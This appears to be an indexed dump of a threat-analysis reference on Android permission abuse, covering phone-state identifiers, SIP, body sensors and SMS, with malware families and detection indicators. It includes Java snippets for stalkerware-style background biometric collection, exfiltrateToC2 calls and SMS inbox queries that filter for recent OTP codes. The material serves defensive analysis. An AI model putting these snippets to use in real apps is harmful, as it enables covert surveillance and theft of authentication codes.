<code>getSubscriberId()</code>, and <code>getSimSerialNumber()</code> restricted to apps with <code>READ_PRIVILEGED_PHONE_STATE</code> (signature|privileged). Third-party apps receive a <code>SecurityException</code>. This was the most significant restriction, eliminating IMEI harvesting for non-system apps.</p> <p>Android 11 (API 30): <code>getLine1Number()</code> requires <code>READ_PHONE_NUMBERS</code> (a separate permission) or the <code>READ_PHONE_STATE</code> permission is insufficient. Further tightened access to phone number.</p> <p>Android 12 (API 31): <code>PhoneStateListener</code> deprecated in favor of <code>TelephonyCallback</code>. Apps targeting API 31+ need <code>READ_PHONE_STATE</code> for call state callbacks but cannot get the incoming number without <code>READ_CALL_LOG</code>.</p> <p>Android 13 (API 33): no new restrictions on <code>READ_PHONE_STATE</code> itself, but Play Store policy enforcement tightened.</p>"},{"location":"permissions/phone/read-phone-state/#post-android-10-alternatives","title":"Post-Android 10 Alternatives","text":"<p>With IMEI access removed, malware adapted:</p> Alternative Identifier Requires Persistence <code>Settings.Secure.ANDROID_ID</code> No permission Resets on factory reset, unique per app signing key <code>ADVERTISING_ID</code> No permission (Play Services) User-resettable <code>Build.SERIAL</code> <code>READ_PHONE_STATE</code> (pre-10), restricted (10+) Hardware-bound Hardware MAC Randomized since Android 10 Not reliable <code>MediaDrm</code> device unique ID No permission Persistent, hardware-bound <p><code>MediaDrm.getPropertyByteArray(\"deviceUniqueId\")</code> with a Widevine provisioning ID has become the preferred fingerprinting method for post-Android 10 malware since it requires no permissions and is hardware-bound.</p>"},{"location":"permissions/phone/read-phone-state/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\" /&gt;\n</code></pre> <p>On its own, <code>READ_PHONE_STATE</code> is common in legitimate apps. Strong indicators of abuse include combination with <code>INTERNET</code> and <code>RECEIVE_BOOT_COMPLETED</code>, immediate exfiltration of <code>TelephonyManager</code> data on first launch, and comparison of IMEI values against known emulator patterns in the code.</p> <p>Look for <code>TelephonyManager</code> usage in static analysis, specifically calls to <code>getDeviceId()</code>, <code>getImei()</code>, and <code>getSubscriberId()</code> followed by network operations.</p>"},{"location":"permissions/phone/use-sip/","title":"USE_SIP","text":"<p>Allows using the SIP (Session Initiation Protocol) service for VoIP calls. Minimal security relevance in modern Android.</p>"},{"location":"permissions/phone/use-sip/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.USE_SIP</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 9 (Android 2.3)"},{"location":"permissions/phone/use-sip/#what-it-enables","title":"What It Enables","text":"<p>Access to Android's built-in SIP stack for making and receiving VoIP calls through the <code>SipManager</code> API:</p> <pre><code>SipManager sipManager = SipManager.newInstance(context);\nSipProfile.Builder builder = new SipProfile.Builder(\"username\", \"sip.example.com\");\nbuilder.setPassword(\"password\");\nbuilder.setPort(5060);\nSipProfile profile = builder.build();\n\nIntent intent = new Intent();\nintent.setAction(\"android.SipDemo.INCOMING_CALL\");\nPendingIntent pendingIntent = PendingIntent.getBroadcast(\n    context, 0, intent, PendingIntent.FLAG_IMMUTABLE\n);\nsipManager.open(profile, pendingIntent, null);\nsipManager.makeAudioCall(\n    profile.getUriString(), \"sip:target@sip.example.com\", null, 30\n);\n</code></pre> <p>Note: Android's native SIP support has been deprecated since Android 12 (API 31). Most VoIP apps use their own SIP or WebRTC stacks instead.</p>"},{"location":"permissions/phone/use-sip/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No known malware families abuse <code>USE_SIP</code> directly. The native SIP stack is rarely used by legitimate apps, let alone by malware. VoIP-based attacks use custom networking code or third-party SIP libraries rather than the Android-provided <code>SipManager</code>.</p>"},{"location":"permissions/phone/use-sip/#theoretical-abuse-scenarios","title":"Theoretical Abuse Scenarios","text":"<p>Unauthorized VoIP Calls: An app with <code>USE_SIP</code> could silently register a SIP account and place VoIP calls to premium-rate SIP URIs, generating charges on the attacker's SIP provider revenue share.</p> <p>Call Eavesdropping: If the device is already registered with a SIP account, malware could listen for incoming SIP calls and record them. However, spyware families like Hermit, Pegasus, and FinSpy that record VoIP conversations do so by hooking into the audio subsystem or using accessibility services rather than the SIP API. These families intercept VoIP audio from apps like WhatsApp, Skype, and Viber at the audio mixer level, making <code>USE_SIP</code> irrelevant to their approach.</p> <p>Covert Communication Channel: A malware C2 channel over SIP would blend with legitimate VoIP traffic, but in practice no families use this technique because HTTP/HTTPS and WebSocket provide more reliable and flexible C2 communication.</p>"},{"location":"permissions/phone/use-sip/#android-version-changes","title":"Android Version Changes","text":"<p>Android 2.3 (API 9): <code>USE_SIP</code> and the <code>SipManager</code> API introduced, providing native SIP calling without third-party libraries.</p> <p>Android 6.0 (API 23): became a runtime permission within the <code>PHONE</code> group.</p> <p>Android 12 (API 31): the native <code>SipManager</code> API was deprecated. Google recommended migrating to third-party SIP libraries or the <code>Otp</code> and <code>ConnectionService</code> APIs. Apps targeting API 31+ that still reference <code>SipManager</code> receive deprecation warnings.</p> <p>Android 14 (API 34): the deprecated SIP API remains functional but receives no updates or bug fixes. The API may be removed entirely in a future Android version.</p>"},{"location":"permissions/phone/use-sip/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.USE_SIP\" /&gt;\n</code></pre> <p>Largely obsolete. Presence in modern apps (targeting API 31+) is unusual and warrants investigation, since the underlying API is deprecated.</p>"},{"location":"permissions/phone/use-sip/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>References to <code>android.net.sip.SipManager</code> or <code>android.net.sip.SipProfile</code></li> <li>SIP URI strings in the format <code>sip:user@domain</code></li> <li><code>SipAudioCall</code> usage indicating active VoIP call handling</li> </ul>"},{"location":"permissions/phone/use-sip/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>USE_SIP</code> combined with RECORD_AUDIO and <code>INTERNET</code> in a non-VoIP app is suspicious. However, this combination is more likely an indicator of an outdated app that has not updated its permission declarations than active malware.</p>"},{"location":"permissions/sensors/","title":"Sensors Permissions","text":"<p>Access to body sensors like heart rate monitors and step counters. Niche abuse potential: biometric data theft from wearables, health data exfiltration. Primarily relevant to fitness app analysis and targeted surveillance rather than commodity malware.</p>"},{"location":"permissions/sensors/#permissions","title":"Permissions","text":"Permission Abuse Potential BODY_SENSORS Read heart rate, step count, and other biometric data from paired sensors BODY_SENSORS_BACKGROUND Continuous background biometric monitoring"},{"location":"permissions/sensors/#health-data-as-intelligence","title":"Health Data as Intelligence","text":"<p>Body sensor data carries disproportionate value in targeted surveillance. Heart rate variability reveals stress responses during specific meetings or conversations. Sleep pattern disruption indicates anxiety. Sudden changes in step counts or activity levels can signal illness, injury, or changes in routine that are operationally relevant.</p> <p>For high-value targets -- executives, diplomats, journalists -- this data provides a physiological layer of surveillance that the target cannot consciously mask. A person can control what they say on a phone call, but they cannot control their resting heart rate spiking during a conversation about a sensitive topic.</p>"},{"location":"permissions/sensors/#wearable-bridge-attack","title":"Wearable Bridge Attack","text":"<p>The most practical sensor exploitation path is through the companion phone app for a wearable device. When a target pairs a smartwatch or fitness tracker with their phone, the companion app (Fitbit, Samsung Health, Garmin Connect) syncs all health data to the phone. A compromised phone app with <code>BODY_SENSORS</code> can then read this synced data, effectively turning the wearable into a remote biometric sensor without ever compromising the wearable itself.</p> <p>This is particularly effective because:</p> <ul> <li>Wearable companion apps request <code>BODY_SENSORS</code> legitimately, so the permission grant does not look anomalous</li> <li>The wearable collects data continuously, including during sleep</li> <li>Historical data is often cached on the phone, providing weeks or months of biometric history in a single exfiltration</li> </ul>"},{"location":"permissions/sensors/#stalkerware-context","title":"Stalkerware Context","text":"<p>Stalkerware apps abuse <code>BODY_SENSORS_BACKGROUND</code> for continuous heart rate monitoring as a proxy for behavior detection. Elevated heart rate at unexpected times, changes in sleep patterns, or sudden increases in physical activity can trigger alerts to the stalker. This transforms health tracking into behavioral surveillance -- the stalker does not need to know where the target is if they can infer what the target is doing from biometric signals alone.</p>"},{"location":"permissions/sensors/#relevant-families","title":"Relevant Families","text":"<p>Pegasus (NSO Group) has documented sensor access capabilities, reading data from paired wearables as part of its full-device compromise. Given Pegasus operates at the OS level with root or equivalent access, it can bypass the permission model entirely, but the <code>BODY_SENSORS</code> permission remains relevant for understanding what data categories are accessible through legitimate API surfaces that less sophisticated implants must use.</p>"},{"location":"permissions/sensors/body-sensors-background/","title":"BODY_SENSORS_BACKGROUND","text":"<p>Allows accessing body sensor data while the app is in the background. Extends <code>BODY_SENSORS</code> to continuous monitoring without requiring the app to be visible.</p>"},{"location":"permissions/sensors/body-sensors-background/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BODY_SENSORS_BACKGROUND</code> Protection Level <code>dangerous</code> Grant Method Runtime permission dialog (separate from foreground sensor access) Introduced API 33 (Android 13)"},{"location":"permissions/sensors/body-sensors-background/#what-it-enables","title":"What It Enables","text":"<p>Continuous sensor data collection without user interaction. The app does not need to be in the foreground or show a notification (unlike foreground services for location).</p> <pre><code>SensorManager sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);\nSensor heartRate = sensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE);\n\nsensorManager.registerListener(new SensorEventListener() {\n    @Override\n    public void onSensorChanged(SensorEvent event) {\n        float bpm = event.values[0];\n        storeLocally(bpm, event.timestamp);\n    }\n\n    @Override\n    public void onAccuracyChanged(Sensor sensor, int accuracy) {\n    }\n}, heartRate, SensorManager.SENSOR_DELAY_NORMAL);\n</code></pre> <p>With <code>BODY_SENSORS_BACKGROUND</code> granted, this listener continues receiving events even when the app is not visible. Without the background permission, the listener is suspended when the app leaves the foreground.</p>"},{"location":"permissions/sensors/body-sensors-background/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No known malware families currently request <code>BODY_SENSORS_BACKGROUND</code>. The permission was introduced in Android 13 and has an extremely narrow legitimate use case, making it both rare in the wild and conspicuous when present.</p>"},{"location":"permissions/sensors/body-sensors-background/#stalkerware-the-primary-threat","title":"Stalkerware: The Primary Threat","text":"<p><code>BODY_SENSORS_BACKGROUND</code> is purpose-built for the stalkerware threat model. A surveillance app installed by an abusive partner could continuously monitor the victim's heart rate and step count without any visible indicator. The data reveals:</p> <ul> <li>Sleep patterns: extended periods of low heart rate and zero steps</li> <li>Exercise and movement: elevated heart rate combined with step activity</li> <li>Emotional state: resting heart rate spikes can correlate with stress, anxiety, or fear</li> <li>Daily routine: step count patterns reveal commute timing, work schedule, and deviations from routine</li> </ul> <p>Unlike ACCESS_BACKGROUND_LOCATION, which requires a persistent notification on Android 12+, background body sensor access has no mandatory user-visible indicator, making it harder for the victim to detect.</p>"},{"location":"permissions/sensors/body-sensors-background/#continuous-biometric-exfiltration","title":"Continuous Biometric Exfiltration","text":"<p>A surveillance app could batch-collect sensor data in a local database and periodically exfiltrate during scheduled sync windows:</p> <pre><code>public class SensorCollector extends Service {\n    private SensorManager sensorManager;\n    private SQLiteDatabase db;\n\n    @Override\n    public int onStartCommand(Intent intent, int flags, int startId) {\n        sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);\n        db = new SensorDatabase(this).getWritableDatabase();\n\n        Sensor heartRate = sensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE);\n        Sensor stepCounter = sensorManager.getDefaultSensor(Sensor.TYPE_STEP_COUNTER);\n\n        SensorEventListener listener = new SensorEventListener() {\n            @Override\n            public void onSensorChanged(SensorEvent event) {\n                ContentValues values = new ContentValues();\n                values.put(\"sensor_type\", event.sensor.getType());\n                values.put(\"value\", event.values[0]);\n                values.put(\"timestamp\", System.currentTimeMillis());\n                db.insert(\"sensor_data\", null, values);\n            }\n\n            @Override\n            public void onAccuracyChanged(Sensor sensor, int accuracy) {\n            }\n        };\n\n        sensorManager.registerListener(listener, heartRate, SensorManager.SENSOR_DELAY_NORMAL);\n        sensorManager.registerListener(listener, stepCounter, SensorManager.SENSOR_DELAY_NORMAL);\n\n        return START_STICKY;\n    }\n\n    @Override\n    public IBinder onBind(Intent intent) {\n        return null;\n    }\n}\n</code></pre>"},{"location":"permissions/sensors/body-sensors-background/#android-version-changes","title":"Android Version Changes","text":"<p>Android 13 (API 33): <code>BODY_SENSORS_BACKGROUND</code> introduced. This mirrors the pattern established with <code>ACCESS_BACKGROUND_LOCATION</code> in Android 10 -- splitting foreground and background access into separate runtime permissions that must be granted independently. Users see a separate permission dialog specifically for background sensor access.</p> <p>Android 14 (API 34): Health Connect API encouraged as the preferred mechanism for health data access. Apps using Health Connect rather than direct sensor access follow a different permission model.</p>"},{"location":"permissions/sensors/body-sensors-background/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BODY_SENSORS_BACKGROUND\" /&gt;\n</code></pre> <p>Very few legitimate apps need background body sensor access outside of dedicated health monitoring apps.</p>"},{"location":"permissions/sensors/body-sensors-background/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>Manifest declares both <code>BODY_SENSORS</code> and <code>BODY_SENSORS_BACKGROUND</code></li> <li><code>SensorEventListener</code> registration inside a <code>Service</code> rather than an <code>Activity</code></li> <li><code>START_STICKY</code> return from <code>onStartCommand()</code> combined with sensor registration (indicates persistent collection)</li> <li>Local database writes in <code>onSensorChanged()</code> callbacks (batch collection for later exfiltration)</li> </ul>"},{"location":"permissions/sensors/body-sensors-background/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>Sensor event listeners remain active after the app is swiped away from recents</li> <li>Background service continuously consuming sensor data without any foreground UI</li> <li>Periodic network bursts containing timestamped biometric data</li> <li>Battery usage attributed to sensor wake locks without corresponding user activity</li> </ul>"},{"location":"permissions/sensors/body-sensors-background/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>BODY_SENSORS_BACKGROUND</code> is suspicious in almost any app that is not a dedicated health monitoring platform. Combined with <code>INTERNET</code> and RECEIVE_BOOT_COMPLETED, it indicates an app designed to persistently collect and exfiltrate biometric data across device reboots. Combined with ACCESS_BACKGROUND_LOCATION and RECORD_AUDIO, it forms a comprehensive background surveillance stack.</p>"},{"location":"permissions/sensors/body-sensors/","title":"BODY_SENSORS","text":"<p>Allows access to body sensor data from paired health devices: heart rate monitors, fitness trackers, and other biometric sensors.</p>"},{"location":"permissions/sensors/body-sensors/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BODY_SENSORS</code> Protection Level <code>dangerous</code> Permission Group <code>SENSORS</code> Grant Method Runtime permission dialog Introduced API 20 (Android 4.4W)"},{"location":"permissions/sensors/body-sensors/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>SensorManager</code> for body sensor types:</p> Sensor Type Data <code>TYPE_HEART_RATE</code> Heart rate in BPM <code>TYPE_STEP_COUNTER</code> Cumulative step count since last reboot <code>TYPE_STEP_DETECTOR</code> Step detection events <p>Also enables reading health data from paired Wear OS devices and Bluetooth health devices.</p>"},{"location":"permissions/sensors/body-sensors/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No major Android malware families are known to specifically request or abuse <code>BODY_SENSORS</code>. The attack surface is small compared to other permission groups because sensor data has limited direct value for financial fraud or credential theft, the primary motivations of most mobile malware.</p>"},{"location":"permissions/sensors/body-sensors/#stalkerware-and-surveillance","title":"Stalkerware and Surveillance","text":"<p>Stalkerware is the most plausible threat category for body sensor abuse. Apps designed to monitor a partner or target could collect heart rate and step data to build a detailed profile of the victim's daily routine. While no documented stalkerware families (including BoneSpy, KoSpy, or PlainGnome) currently collect body sensor data, the capability requires minimal code:</p> <pre><code>SensorManager sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);\nSensor heartRate = sensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE);\nsensorManager.registerListener(new SensorEventListener() {\n    @Override\n    public void onSensorChanged(SensorEvent event) {\n        float bpm = event.values[0];\n        long timestamp = event.timestamp;\n        exfiltrateToC2(bpm, timestamp);\n    }\n\n    @Override\n    public void onAccuracyChanged(Sensor sensor, int accuracy) {\n    }\n}, heartRate, SensorManager.SENSOR_DELAY_NORMAL);\n</code></pre>"},{"location":"permissions/sensors/body-sensors/#health-data-theft","title":"Health Data Theft","text":"<p>Biometric data has value for blackmail, insurance fraud, or intelligence profiling. Heart rate data can reveal:</p> <ul> <li>Stress patterns (elevated resting heart rate during specific meetings or locations)</li> <li>Sleep schedule (low heart rate extended periods)</li> <li>Exercise routines and physical fitness level</li> <li>Medical conditions (arrhythmia, tachycardia)</li> </ul>"},{"location":"permissions/sensors/body-sensors/#activity-inference-via-step-counter","title":"Activity Inference via Step Counter","text":"<p>Step counter data is particularly useful for behavioral profiling because <code>TYPE_STEP_COUNTER</code> provides a cumulative count since last reboot, meaning a single reading reveals the total activity level:</p> <pre><code>Sensor stepCounter = sensorManager.getDefaultSensor(Sensor.TYPE_STEP_COUNTER);\nsensorManager.registerListener(new SensorEventListener() {\n    @Override\n    public void onSensorChanged(SensorEvent event) {\n        float totalSteps = event.values[0];\n        exfiltrateToC2(totalSteps, System.currentTimeMillis());\n    }\n\n    @Override\n    public void onAccuracyChanged(Sensor sensor, int accuracy) {\n    }\n}, stepCounter, SensorManager.SENSOR_DELAY_NORMAL);\n</code></pre> <p>Periodic readings reveal when the target is moving, stationary, or sleeping.</p>"},{"location":"permissions/sensors/body-sensors/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4W (API 20): <code>BODY_SENSORS</code> introduced with Android Wear, initially targeting wearable devices with built-in heart rate sensors.</p> <p>Android 6.0 (API 23): became a runtime permission. Apps must request <code>BODY_SENSORS</code> at runtime before accessing heart rate or step sensors.</p> <p>Android 13 (API 33): <code>BODY_SENSORS_BACKGROUND</code> introduced as a separate permission (see BODY_SENSORS_BACKGROUND). Foreground-only sensor access requires only <code>BODY_SENSORS</code>, but continuous background monitoring requires the additional background permission. This mirrors the foreground/background split applied to location in Android 10.</p> <p>Android 14 (API 34): Health Connect API introduced as the recommended way to access health and fitness data, consolidating data from multiple sensor sources. <code>BODY_SENSORS</code> remains valid for direct sensor access but Health Connect is preferred for cross-app health data sharing.</p>"},{"location":"permissions/sensors/body-sensors/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BODY_SENSORS\" /&gt;\n</code></pre> <p>Only expected in fitness, health, and wearable companion apps.</p>"},{"location":"permissions/sensors/body-sensors/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li><code>SensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE)</code> or <code>TYPE_STEP_COUNTER</code></li> <li><code>SensorEventListener</code> implementations that transmit sensor values over the network</li> <li>Registration for sensor events with <code>SENSOR_DELAY_FASTEST</code> (indicates data harvesting rather than user-facing display)</li> </ul>"},{"location":"permissions/sensors/body-sensors/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>App registers for body sensor events without displaying any health-related UI</li> <li>Sensor data appearing in network traffic payloads</li> <li>Continuous sensor registration that persists when the app is backgrounded (requires BODY_SENSORS_BACKGROUND on Android 13+)</li> </ul>"},{"location":"permissions/sensors/body-sensors/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>BODY_SENSORS</code> combined with <code>INTERNET</code>, ACCESS_FINE_LOCATION, and RECORD_AUDIO in a non-fitness app is a strong indicator of comprehensive surveillance. When combined with BODY_SENSORS_BACKGROUND, the app can perform 24/7 biometric monitoring.</p>"},{"location":"permissions/sms/","title":"SMS Permissions","text":"<p>SMS permissions provide access to send, receive, and read text messages. Heavily regulated by Google Play policy since SMS is one of the most abused permission groups: OTP interception, premium SMS fraud, and worm-like spreading via phishing messages.</p>"},{"location":"permissions/sms/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_SMS Read stored messages, harvest OTPs retroactively RECEIVE_SMS Intercept incoming messages in real-time, suppress notifications SEND_SMS Send messages for premium fraud, phishing distribution, C2 communication RECEIVE_WAP_PUSH Intercept MMS push notifications RECEIVE_MMS Intercept incoming MMS messages"},{"location":"permissions/sms/#play-store-policy","title":"Play Store Policy","text":"<p>Since January 2019, Google restricts SMS and Call Log permissions to apps declared as the default SMS handler or that have an approved use case. Apps that cannot justify the need are rejected. This pushed malware distribution toward sideloading and alternative stores.</p> <p>Malware works around this by:</p> <ul> <li>Using accessibility to read SMS notifications instead of the SMS permission</li> <li>Using notification listener service to intercept OTPs</li> <li>Distributing outside Play Store via smishing (SMS phishing) links</li> </ul>"},{"location":"permissions/sms/#families-by-sms-permission-abuse","title":"Families by SMS Permission Abuse","text":"Family Primary SMS Permissions Technique FluBot <code>SEND_SMS</code>, <code>READ_CONTACTS</code> Worm behavior -- reads the contact list and sends SMS phishing messages to every entry, propagating itself across the victim's social graph Joker (Bread) <code>SEND_SMS</code>, <code>RECEIVE_SMS</code> Premium SMS fraud -- subscribes victims to paid services by sending SMS to premium numbers and intercepting confirmation messages to complete the signup silently Anubis <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Banking trojan -- intercepts OTP codes sent via SMS to bypass two-factor authentication on financial accounts Cerberus <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Banking trojan -- real-time OTP interception with automatic forwarding to C2, also reads stored SMS for account recovery codes BRATA <code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> Banking trojan -- intercepts OTPs, can send SMS to attacker-controlled numbers, performs factory reset via device admin after successful theft Pegasus <code>READ_SMS</code>, <code>RECEIVE_SMS</code> State-sponsored -- full SMS database exfiltration for intelligence collection, not fraud"},{"location":"permissions/sms/#sms-as-c2-channel","title":"SMS as C2 Channel","text":"<p>Some families use SMS for command and control as a fallback when internet connectivity is unavailable or when network-level monitoring makes HTTP/HTTPS C2 too risky:</p> <ul> <li>The operator sends specially formatted SMS messages to the infected device containing encoded commands</li> <li>The implant parses incoming SMS, executes the command, and optionally replies via SMS with results</li> <li>SMS-based C2 is harder to block than domain-based C2 because it does not rely on DNS or IP infrastructure that defenders can sinkhole</li> <li>The tradeoff is visibility -- SMS messages appear in carrier logs and can be intercepted by lawful interception systems, making this channel less covert than encrypted HTTPS</li> </ul> <p>This technique is most common in state-sponsored tooling (FinSpy, early Pegasus variants) where the operator controls or has access to carrier infrastructure, neutralizing the visibility risk.</p>"},{"location":"permissions/sms/#evolution-notification-listeners-replace-sms-permissions","title":"Evolution: Notification Listeners Replace SMS Permissions","text":"<p>Modern families increasingly avoid requesting SMS permissions entirely. Instead, they use <code>NotificationListenerService</code> to read OTP codes as they appear in the notification shade:</p> <ul> <li>No runtime permission required -- the user enables the notification listener through Settings &gt; Apps &gt; Special Access, which malware guides the user toward via overlay or social engineering</li> <li>Broader coverage -- notification listeners capture OTPs from SMS, WhatsApp, email, and authenticator apps through a single access grant</li> <li>Evades Play Store policy -- since the app never requests <code>READ_SMS</code> or <code>RECEIVE_SMS</code>, it does not trigger Google's restricted permission review</li> <li>Families using this approach include Xenomorph, SharkBot, and recent Vultur variants, which have dropped SMS permissions entirely in favor of notification access combined with accessibility services</li> </ul>"},{"location":"permissions/sms/read-sms/","title":"READ_SMS","text":"<p>Grants access to all SMS messages stored on the device. The primary use in malware is OTP interception -- reading one-time passwords sent by banks and online services to complete unauthorized transactions or account takeovers. Also used for SMS forwarding (exfiltrating entire message history to C2), contact harvesting from message metadata, and confirming premium service subscriptions. Despite years of platform restrictions and Google Play policy changes, SMS-based 2FA remains widespread enough that this permission is still a high-value target for banking trojans.</p>"},{"location":"permissions/sms/read-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>android.permission-group.SMS</code> Grant Method Runtime permission dialog Introduced API 1 Play Store Policy Restricted since January 2019 to default SMS handlers and approved use cases"},{"location":"permissions/sms/read-sms/#what-it-enables","title":"What It Enables","text":"<p>Access to the SMS content provider at <code>content://sms/</code>. The app can read all stored messages across inbox, sent, drafts, and outbox:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms/inbox\"),\n    new String[]{\"address\", \"body\", \"date\", \"read\", \"type\"},\n    null,\n    null,\n    \"date DESC\"\n);\n\nwhile (cursor.moveToNext()) {\n    String sender = cursor.getString(cursor.getColumnIndex(\"address\"));\n    String body = cursor.getString(cursor.getColumnIndex(\"body\"));\n    long timestamp = cursor.getLong(cursor.getColumnIndex(\"date\"));\n}\ncursor.close();\n</code></pre> <p>The SMS content provider schema:</p> Field Content Abuse Value <code>address</code> Sender/recipient phone number Contact graph extraction <code>body</code> Message text OTP codes, personal data <code>date</code> Timestamp (milliseconds since epoch) Timing attacks, recent OTP targeting <code>read</code> Read/unread status (0/1) Target unread OTPs first <code>type</code> Inbox (1), Sent (2), Draft (3), Outbox (4) Filter for incoming messages <code>thread_id</code> Conversation thread identifier Group messages by contact <code>person</code> Contact ID if sender is in contacts Cross-reference with contact data"},{"location":"permissions/sms/read-sms/#targeted-otp-query","title":"Targeted OTP Query","text":"<p>Malware often filters for recent messages from known banking short codes or containing OTP patterns:</p> <pre><code>String selection = \"date &gt; ? AND body LIKE ?\";\nString[] args = {\n    String.valueOf(System.currentTimeMillis() - 120000),\n    \"%verification code%\"\n};\nCursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms/inbox\"),\n    new String[]{\"address\", \"body\"},\n    selection,\n    args,\n    \"date DESC\"\n);\n</code></pre>"},{"location":"permissions/sms/read-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/read-sms/#otp-interception","title":"OTP Interception","text":"<p>The primary abuse case. Banks and online services send authentication codes via SMS. Malware reads these to complete unauthorized transactions or account takeovers.</p> <p>Two complementary approaches:</p> Approach Permission Mechanism Timing Retroactive <code>READ_SMS</code> Query <code>content://sms/inbox</code> for recent messages After OTP arrives, with slight delay Real-time <code>RECEIVE_SMS</code> <code>BroadcastReceiver</code> with <code>SMS_RECEIVED</code> action and high priority Immediate, can suppress notification <p>Most families use both: <code>RECEIVE_SMS</code> for real-time interception with notification suppression, and <code>READ_SMS</code> as a fallback to scan the inbox if the broadcast receiver misses a message.</p>"},{"location":"permissions/sms/read-sms/#sms-forwarding-to-c2","title":"SMS Forwarding to C2","text":"<p>Malware reads the entire SMS inbox and forwards all messages to C2. This captures OTPs, bank transaction alerts, personal messages, and any SMS-based verification. Some families set up a periodic task (via <code>AlarmManager</code> or <code>WorkManager</code>) to continuously exfiltrate new messages.</p>"},{"location":"permissions/sms/read-sms/#premium-sms-subscription-fraud","title":"Premium SMS Subscription Fraud","text":"<p>Joker (also known as Bread) uses <code>READ_SMS</code> to intercept confirmation codes for premium service subscriptions it initiates silently. The malware simulates clicks on premium subscription web pages, reads the confirmation SMS code, and completes the subscription -- all without user awareness. Over 1,800 Joker-infected apps were removed from Google Play between 2017 and 2023, according to Zimperium research.</p>"},{"location":"permissions/sms/read-sms/#sms-worm-propagation","title":"SMS Worm Propagation","text":"<p>FluBot read the victim's SMS history and contact list to craft targeted smishing messages, sending itself to all contacts via SMS. The worm spread across Europe from late 2020 until Europol disrupted its infrastructure in May 2022. FluBot replaced the default SMS app to intercept all incoming messages, capturing banking OTPs while simultaneously using the SMS channel for propagation.</p>"},{"location":"permissions/sms/read-sms/#notable-families","title":"Notable Families","text":"Family SMS Abuse Source FluBot SMS worm: reads contacts, sends smishing messages, replaces default SMS app for OTP interception Europol Cerberus OTP theft via SMS reading combined with notification listener for redundant capture ThreatFabric Joker Reads SMS to extract confirmation codes for premium service subscriptions initiated silently Zscaler TrickMo Real-time SMS forwarding to bypass banking 2FA, 40+ variants identified with 16 droppers Zimperium BRATA SMS interception for banking fraud, prompts user to set malware as default SMS app, wipes device post-theft Cleafy MoqHao SMS-based distribution (smishing via Roaming Mantis), reads and exfiltrates SMS on infected devices McAfee Anatsa SMS interception for transaction authorization codes during on-device fraud ThreatFabric"},{"location":"permissions/sms/read-sms/#google-play-sms-policy-crackdown","title":"Google Play SMS Policy Crackdown","text":"<p>In October 2018, Google announced restrictions on SMS and Call Log permissions. Enforcement began January 9, 2019:</p> <ul> <li>Only apps designated as the default SMS handler, Phone handler, or Assistant handler may declare <code>READ_SMS</code>, <code>RECEIVE_SMS</code>, <code>SEND_SMS</code>, or Call Log permissions</li> <li>All other apps must remove these permissions from their manifest or submit a Permissions Declaration Form with justification</li> <li>Apps that failed to comply were removed from the Play Store</li> <li>Limited exemptions granted for specific use cases (e.g., backup apps, dual-SIM managers)</li> </ul> <p>This policy crippled many legitimate apps but also forced malware to adapt. Post-2019 banking trojans increasingly shifted to:</p> <ul> <li>Notification listener for OTP capture (does not require SMS permission)</li> <li>Accessibility service to read notification content from the screen</li> <li>Overlay phishing of authenticator apps to capture TOTP codes</li> <li>Sideloading distribution to avoid Play Store policy entirely</li> </ul>"},{"location":"permissions/sms/read-sms/#alternatives-when-read_sms-is-unavailable","title":"Alternatives When READ_SMS Is Unavailable","text":"<p>When <code>READ_SMS</code> is difficult to obtain (Play Store restrictions, user suspicion), malware uses alternative channels:</p> Alternative Permission Required Mechanism Limitations Notification listener <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Reads OTP from notification text Requires user toggle in Settings, only sees notification content Accessibility service <code>BIND_ACCESSIBILITY_SERVICE</code> Reads any on-screen text including SMS notifications Requires user toggle, subject to restricted settings on Android 13+ Overlay on authenticator <code>SYSTEM_ALERT_WINDOW</code> Phishes TOTP codes by overlaying Google Authenticator or similar apps Only captures app-based 2FA, not SMS Push notification interception <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Captures push-based OTPs from banking apps that moved away from SMS Same limitations as notification listener <p>The shift toward notification-based OTP interception has reduced reliance on <code>READ_SMS</code> in newer malware families. 